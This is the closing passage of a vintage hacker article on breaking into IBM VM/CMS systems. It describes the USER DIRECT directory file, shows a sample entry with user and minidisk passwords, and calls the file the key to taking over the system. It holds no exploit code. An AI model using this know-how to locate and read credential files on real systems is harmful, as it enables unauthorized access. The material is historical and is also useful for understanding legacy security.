+directory, as previously explained contains users' passwords, various system
+information and minidisk passwords. The directory usually goes under the
+filename/filetype of USER DIRECT. It can be anywhere on the system, and can
+have a different name which in my view would add to system security. It is
+usually found in either or both of two users' directorys which I leave to you
+to find (sorry). This is a very big weakness in CMS due to the fact that if you
+can find what userid the directory is in, and it's disk access password, you've
+got the system by the balls. The file may also have a filetype of INDEX which
+is a compilation or sorting of pertinent information used for speeding up
+various procedures the system carries out constantly. A typical entry in the
+USER DIRECT file would look like:
+
+USER BUBBA BUBAPASS 1M 3M BG
+
+VMU01000
+ ACCOUNT 101 SYSPROG
+
+VMU01010
+ IPL CMS
+
+VMU01020
+ CONSOLE 00D 3215
+
+VMU01030
+ SPOOL 00C 2540 READER *
+
+VMU01040
+ SPOOL 00D 2540 PUNCH *
+
+VMU01050
+ SPOOL 00E 1403 A
+
+VMU01060
+ LINK MAINT 190 190 RR
+
+VMU01070
+ LINK MAINT 19D 19D RR
+
+VMU01080
+ LINK MAINT 19E 19E RR
+
+VMU01090
+ MDISK 191 3350 152 003 VMPK01 MR RBUBBA WBUBBA   MBUBBA
+ MDISK 192 3350 152 003 VMPK01 MR RBUBPW BONEHEAD MULTIBUB
+
+VMU01100
+*
+
+
+The first line gives the userid of BUBBA, password BUBAPASS, 1 and 3 Megs of
+virtual memory, and Privilege Classes B and G. The next line gives the account
+number and department or owner of the account. The next few lines define
+miscellaneous system information. Next, three lines of what disks should be
+automatically linked to upon logon. And finally the minidisk (MDISK) virtual
+addresses and corresponding passwords.
+
+
+CONCLUSION:
+-----------
+
+As usual, there is always more I could add to an article like this one. I did
+not want to keep writing part after part so I wrote a 'complete' article on
+Hacking VM/CMS. I apologize for its length of over 50K but I wanted to mention
+everything you needed to become familiar with the Operating System and its
+Security/Insecurity. I intentionally 'forgot' to mention various information
+which would put sensitive and destructive information in the hands of anyone
+who reads this article. The information within this article can and will be
+different from system to system so don't take anything too literally. This
+article is comprised: 80% information from actual system use, 10% CMS help
+files, and 10% from various CMS documentation. I may write a followup article
+of shorter length as more people become familiar with CMS.
+
+Lex Luthor
+
